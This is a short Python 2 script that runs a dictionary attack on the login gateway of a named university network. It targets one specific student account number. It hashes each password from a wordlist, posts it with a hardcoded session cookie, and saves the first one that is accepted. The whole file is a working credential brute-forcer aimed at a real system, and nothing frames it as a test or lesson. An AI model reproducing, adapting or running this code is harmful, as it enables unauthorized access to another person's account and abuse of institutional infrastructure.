# -*- coding: utf-8 -*-
import requests
# import md5
import hashlib
url='http://gw.buaa.edu.cn/cgi-bin/do_login'
num='14051180'
zidian='passtry3xmj'


def getthekey(src):
    m2 = hashlib.md5()
    m2.update(src)
    key = m2.hexdigest()[8:24]
    # print key
    return key

def send(passwd):

    # Host: gw.buaa.edu.cn
    headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://gw.buaa.edu.cn/?url=go.microsoft.com%27',
            'Content-Length': '63',
            'Cookie': '_ga=GA1.3.1523555446.1451222315; PHPSESSID=69gr3c0mcsfvakfgirnl647m57',
            'Connection': 'keep-alive'
            }

    data='username='+num+'&password='+getthekey(passwd)+'&drop=0&type=1&n=100'
    s=requests.post(url, headers=headers, data=data)

    # print s.content
    if 'error' in s.content:
        # print 'key wrong'
        return 0
    else:
        print 'success! key is %s' %getthekey(passwd)
        ff=open('keywords.txt','w')
        ff.write(getthekey(passwd))
        return 1


def run():
    i=1
    f=open(zidian, 'r')
    for line in f:
        # print i
        i=i+1
        passwd = line[:-1]            #这里非常注意，按行读取的时候python会读入换行符号，所以要把最后一位过滤掉
        print str(i)+':'+passwd
        c=send(passwd)
        if c:
            break
    f.close()


    # header={}
    # POST http://gw.buaa.edu.cn/cgi-bin/do_login HTTP/1.1

if __name__ == '__main__':
    run()